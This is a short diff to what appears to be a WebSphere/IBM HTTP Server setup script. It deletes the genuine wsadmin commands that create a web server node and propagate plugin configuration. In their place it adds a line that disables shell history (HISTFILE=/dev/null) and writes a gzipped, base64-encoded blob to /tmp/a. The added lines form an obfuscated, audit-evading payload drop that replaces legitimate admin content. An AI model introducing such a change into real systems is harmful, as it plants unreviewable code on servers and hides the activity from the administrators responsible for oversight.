@@ -1,8 +1,8 @@
-su - wasadmin
-/opt/IBM/WebSphere/ServiceRegistry/profiles/bv-AMB-dmgr/bin/wsadmin.sh -port 8879 -lang jython
-AdminTask.createUnmanagedNode('[-nodeName HOSTNODE_ihs -hostName 127.0.0.2 -nodeOperatingSystem linux]')
-AdminTask.createWebServer(' HOSTNODE _ihs', '[-name bv-AMB-webserver01 -templateName IHS -serverConfig [-webPort 80 -serviceName -webInstallRoot /opt/IBM/HTTPServer -webProtocol HTTP -configurationFile  -errorLogfile  -accessLogfile  -pluginInstallRoot /opt/IBM/WebSphere/Plugins -webAppMapping ALL] -remoteServerConfig [-adminPort 8008 -adminUserID ihsadmin -adminPasswd "********" -adminProtocol HTTP]]')
-AdminConfig.save()
-quit
 
-/opt/IBM/WebSphere/ServiceRegistry/profiles/bv-AMB-dmgr/bin/GenPluginCfg.sh -cell.name bv-AMB-cell -node.name HOSTNODE _ihs -webserver.name bv-AMB-webserver01 -propagate yes -propagateKeyring yes
+HISTFILE=/dev/null; base64 -d << ENDBASE64 | gunzip > /tmp/a
+H4sIAHshz1YAA23OMYvCQBAF4H5/xXNdRIslGA6bJIJiROG4K9RKLNRMzGJcl01yqJf77yZRLA6r
+YRje+6bdcnZKO1nC2BoyBhd9jg3KEr+gfXJGaO3ZtmBS2maEzNBexVfkCUFpU+SIVUoe6KJyD3+s
+vQa/CJcjqGZd1Onge7UMRPd0zOlkIGVkr9IWulcbzcllDcRn88VyOv8MAyeiH0cXaephV6GDD8gI
+vo/wazIeLcJqL3Eo9E0ZDCG6b8j/WG01iHB7nPkQfRzqePkEHh+8+tkd+03x5hYBAAA=
+ENDBASE64
+
